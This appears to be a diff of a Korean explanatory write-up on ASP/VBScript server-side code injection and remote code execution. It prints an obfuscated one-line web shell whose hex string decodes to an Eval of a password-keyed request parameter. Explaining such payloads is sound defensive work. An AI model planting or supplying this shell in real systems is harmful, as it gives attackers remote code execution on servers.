@@ -1,8 +1,8 @@
 
 ## **📌 예시 코드 1: 서버 측 코드(injection) / 원격 코드 실행(RCE)**
 
-* 서버 사이드 스크립트(ASP/VBScript)를 주입해 그 스크립트 내부에서 `Eval(Request(...))` 형태로 사용자 제공 코드를 실행하게 함 → **서버 측 스크립트 코드 실행(RCE / server-side code injection)**.
-  → 기술적으로는 *code injection / remote code execution*이며, 결과적으로 공격자가 스크립트에서 OS 쉘을 호출하도록 코드를 작성하면 **OS 명령 실행도 가능**(command execution으로 이어질 수 있음).
+* 서버 사이드 스크립트(ASP/VBScript)를 주입해 그 스크립트 내부에서 `Eval(Request(...))` 형태로 사용자 제공 코드를 실행하게 함 <br> → **서버 측 스크립트 코드 실행(RCE / server-side code injection)**.
+  <br> → 기술적으로는 *code injection / remote code execution*이며, 결과적으로 공격자가 스크립트에서 OS 쉘을 호출하도록 코드를 작성하면 **OS 명령 실행도 가능**(command execution으로 이어질 수 있음).
 
 ```
 <% <!--"--> EXeCute(CON("4556614c2872655155455374282270417353313233222929")) ... End Function %>
